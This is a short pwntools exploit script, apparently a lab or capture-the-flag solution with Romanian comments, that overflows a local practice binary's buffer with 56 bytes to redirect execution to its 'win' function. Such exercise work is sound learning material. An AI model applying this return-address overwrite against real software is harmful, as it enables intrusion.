#!/usr/bin/env python3
from pwn import *

target = process("./bin/ex3")
elf = ELF("./bin/ex3")

win_addr = elf.symbols["win"]
print(f"[+] Adresa functiei win: {hex(win_addr)}")

# Offset corect: 56 octeți (găsit prin bruteforce)
payload = b"A" * 56 + p64(win_addr)

target.sendline(payload)
print("[+] Output program:")
print(target.recvall().decode())
